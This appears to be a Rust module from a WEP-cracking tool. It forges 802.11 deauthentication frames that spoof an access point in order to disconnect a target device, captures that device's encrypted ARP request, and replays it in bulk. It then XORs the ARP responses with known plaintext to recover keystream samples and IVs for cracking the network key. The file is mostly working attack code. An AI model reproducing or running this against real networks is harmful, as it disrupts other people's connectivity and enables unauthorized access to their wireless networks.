use std::{
    collections::VecDeque,
    sync::atomic::{AtomicBool, Ordering},
    time::{Duration, Instant},
};

use anyhow::Context;
use ieee80211::{
    DSStatus, DataFrame, DataFrameTrait, DataSubtype, DeauthenticationFixedParametersBuilderTrait,
    DeauthenticationFrameBuilder, FragmentSequenceTrait, Frame, FrameBuilderTrait, FrameLayer,
    FrameSubtype, FrameTrait, FrameType, FrameVersion, MacAddress, ManagementFrameBuilderTrait,
    ManagementSubtype,
};

use crate::{ieee80211::IEEE80211PacketSniffer, keycracker::KeystreamSample, wep::WepIV};

pub struct ARPSampleSupplier {
    sniffer: IEEE80211PacketSniffer,
    target_dev_mac: MacAddress,
    arp_request: Frame<'static>,

    sample_buf: VecDeque<KeystreamSample>,
}

impl ARPSampleSupplier {
    const ARP_PACKET_SIZE: usize = 28;

    const SAMPLE_BUF_SIZE: usize = 128;
    const SAMPLE_TIMEOUT: Duration = Duration::from_millis(10);

    pub fn try_capture_arp_request(
        ap_mac: &MacAddress,
        dev_mac: &MacAddress,
        sniffer: &mut IEEE80211PacketSniffer,
    ) -> anyhow::Result<Option<Frame<'static>>> {
        sniffer
            .set_timeout(Some(Duration::from_secs(5)))
            .context("failed to set sniffer timeout")?;

        //Send a deauth request
        let mut deauth = DeauthenticationFrameBuilder::new();
        deauth.version(FrameVersion::Standard);
        deauth.type_(FrameType::Management);
        deauth.subtype(FrameSubtype::Management(
            ManagementSubtype::Deauthentication,
        ));
        deauth.ds_status(DSStatus::NotLeavingDSOrADHOC);
        deauth.source_address(*ap_mac);
        deauth.bssid_address(*ap_mac);
        deauth.destination_address(*dev_mac);
        deauth.reason_code(ieee80211::ReasonCode::Inactivity);

        sniffer
            .inject_frame(&deauth.build())
            .context("failed to inject deauth packet")?;

        //Sniff packets for an ARP-Request for a bit
        const TIMEOUT: Duration = Duration::from_secs(5);

        sniffer
            .set_timeout(Some(TIMEOUT))
            .expect("failed to set 802.11 sniffer timeout");

        let start_time = Instant::now();
        while start_time.elapsed() < TIMEOUT {
            //Receive a packet
            let packet = sniffer
                .sniff_packet()
                .expect("failed to sniff ARP request packet");

            let Some(packet) = packet else {
                break;
            };
            let frame = packet.ieee80211_frame();

            //Check if this is an encrypted broadcast packet from our target device
            let Some(FrameLayer::Data(data)) = frame.next_layer() else {
                continue;
            };

            if !data.protected()
                || data.source_address() != Some(*dev_mac)
                || !data
                    .destination_address()
                    .map_or(false, |dst| dst.is_broadcast())
            {
                continue;
            }

            //Check if this most likely is an ARP request
            let Some(data) = data.next_layer() else {
                continue;
            };
            let data = &data[..data.len() - 4]; //Last 4 bytes are garbage

            if data.len() == 8 + Self::ARP_PACKET_SIZE {
                return Ok(Some(Frame::new(Vec::from(
                    &frame.bytes()[..frame.bytes().len() - 4],
                ))));
            }
        }

        Ok(None)
    }

    pub fn new(
        mut sniffer: IEEE80211PacketSniffer,
        target_dev_mac: MacAddress,
        arp_request: Frame<'static>,
    ) -> Self {
        sniffer
            .set_timeout(Some(Self::SAMPLE_TIMEOUT))
            .expect("failed to set 802.11 sniffer timeout");

        ARPSampleSupplier {
            sniffer,
            target_dev_mac,
            arp_request,
            sample_buf: VecDeque::with_capacity(Self::SAMPLE_BUF_SIZE),
        }
    }

    pub fn provide_sample(&mut self, should_exit: &AtomicBool) -> Option<KeystreamSample> {
        if self.sample_buf.is_empty() {
            //Refill the sample buffer
            while !should_exit.load(Ordering::SeqCst)
                && self.sample_buf.len() < Self::SAMPLE_BUF_SIZE
            {
                //Replay a bunch of ARP requests
                for _ in 0..Self::SAMPLE_BUF_SIZE {
                    self.sniffer
                        .inject_frame(&self.arp_request)
                        .expect("failed to inject replayed ARP request");
                }

                //Sniff packets for a response for a bit
                let start_time = Instant::now();
                while start_time.elapsed() < Self::SAMPLE_TIMEOUT {
                    //Receive a response packet
                    let packet = self
                        .sniffer
                        .sniff_packet()
                        .expect("failed to sniff ARP response packet");

                    let Some(packet) = packet else {
                        break;
                    };
                    let frame = packet.ieee80211_frame();

                    //Check if this is an encrypted response packet to our target device
                    let Some(FrameLayer::Data(data)) = frame.next_layer() else {
                        continue;
                    };

                    if !data.protected() || data.destination_address() != Some(self.target_dev_mac)
                    {
                        continue;
                    }

                    //Get the IV from the packet
                    let mut index = DataFrame::FRAGMENT_SEQUENCE_START + 2;
                    if matches!(data.subtype(), FrameSubtype::Data(DataSubtype::QoSData)) {
                        index += 2;
                    }
                    let mut iv = WepIV::default();
                    iv.copy_from_slice(&data.bytes()[index..index + 3]);

                    let Some(data) = data.next_layer() else {
                        continue;
                    };
                    let data = &data[..data.len() - 4]; //Last 4 bytes are garbage

                    //Check if this most likely is an ARP response
                    if data.len() == 8 + Self::ARP_PACKET_SIZE {
                        const ARP_RESPONSE_PLAINTEXT: [u8; 16] = [
                            0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00,
                            0x06, 0x04, 0x00, 0x02,
                        ];

                        //Recover the keystream
                        let mut keystream = [0u8; KeystreamSample::KEYSTREAM_LEN];
                        for i in 0..16 {
                            keystream[i] = data[i] ^ ARP_RESPONSE_PLAINTEXT[i];
                        }

                        //Put it into the buffer
                        self.sample_buf.push_back(KeystreamSample { keystream, iv });
                    }
                }
            }
        }

        return self.sample_buf.pop_front();
    }
}
